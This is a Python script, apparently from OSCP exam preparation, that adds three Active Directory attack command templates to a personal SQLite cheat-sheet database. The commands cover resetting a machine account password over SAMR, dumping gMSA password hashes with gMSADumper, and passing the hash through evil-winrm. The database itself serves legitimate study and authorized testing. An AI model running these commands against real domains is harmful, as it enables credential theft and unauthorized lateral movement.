#!/usr/bin/env python3
"""
##############################################
## Freeworld - Allergic to aluminum baby   ##
## OSCP Command DB - gMSA / SAMR PATCH     ##
##############################################
Adds gMSA and machine account password change commands
Usage:
    python3 gmsa_patch.py
Skips duplicates by exact command match - safe to re-run.
"""
import sqlite3
import os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

commands = [
    {
        "tool": "impacket-changepasswd",
        "description": "Change a machine account password via RPC-SAMR -- useful after RBCD/relay attack to set known creds",
        "command": "impacket-changepasswd DOMAIN/MACHINE\\$@TARGET_IP -newpass 'newpassword' -p rpc-samr",
        "category": "ad-attacks",
        "tags": "windows,ad,machine-account,password-change,samr,rbcd,impacket"
    },
    {
        "tool": "gMSADumper",
        "description": "Dump gMSA password hashes using machine account credentials -- reveals NT hash for the gMSA account",
        "command": "python3 gMSADumper.py -u 'MACHINE$' -p 'password' -d 'DOMAIN'",
        "category": "ad-attacks",
        "tags": "windows,ad,gmsa,password-dump,machine-account,hash"
    },
    {
        "tool": "gMSADumper",
        "description": "Use dumped gMSA NT hash for pass-the-hash or evil-winrm access",
        "command": "evil-winrm -i TARGET_IP -u 'gMSA_ACCOUNT$' -H 'NT_HASH'",
        "category": "ad-attacks",
        "tags": "windows,ad,gmsa,pass-the-hash,evil-winrm,lateral-movement"
    },
]

def run():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    added = 0
    skipped = 0
    for entry in commands:
        c.execute("SELECT id FROM commands WHERE command = ?", (entry["command"],))
        if c.fetchone():
            print(f"  [~] Skipped (exists): {entry['tool']} -- {entry['description'][:50]}")
            skipped += 1
        else:
            c.execute(
                "INSERT INTO commands (tool, description, command, category, tags) VALUES (?,?,?,?,?)",
                (entry["tool"], entry["description"], entry["command"], entry["category"], entry["tags"])
            )
            print(f"  [+] Added: {entry['tool']} -- {entry['description'][:50]}")
            added += 1
    conn.commit()
    conn.close()
    print(f"\n  Done. {added} added, {skipped} skipped.\n")

if __name__ == "__main__":
    run()
